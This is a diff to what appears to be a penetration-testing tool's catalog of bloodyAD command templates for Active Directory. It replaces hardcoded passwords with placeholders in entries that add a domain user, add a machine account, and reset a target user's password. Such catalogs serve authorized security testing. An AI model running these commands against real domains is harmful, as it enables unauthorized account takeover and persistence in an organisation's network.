@@ -8,7 +8,7 @@ order = 33
 [[command]]
 id = "bad.add_user"
 title = "bloodyAD — add user"
-template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' add user newuser 'P@ssw0rd!'"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' add user newuser '{new_password}'"
 requires = ["bloodyAD"]
 tags = ["bloodyad", "create"]
 when = "creds.kind == 'plaintext' and target.has_dc"
@@ -16,7 +16,7 @@ when = "creds.kind == 'plaintext' and target.has_dc"
 [[command]]
 id = "bad.add_computer"
 title = "bloodyAD — add computer (MAQ)"
-template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' add computer 'CHRONO$' 'Mach1neP@ss!'"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' add computer 'CHRONO$' '{computer_password}'"
 requires = ["bloodyAD"]
 tags = ["bloodyad", "maq"]
 when = "creds.kind == 'plaintext' and target.has_dc"
@@ -24,7 +24,7 @@ when = "creds.kind == 'plaintext' and target.has_dc"
 [[command]]
 id = "bad.set_password"
 title = "bloodyAD — set user password (reset)"
-template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' set password TARGET_USER 'Pwn3d!1'"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' set password TARGET_USER '{new_password}'"
 requires = ["bloodyAD"]
 tags = ["bloodyad", "reset"]
 when = "creds.kind == 'plaintext' and target.has_dc"
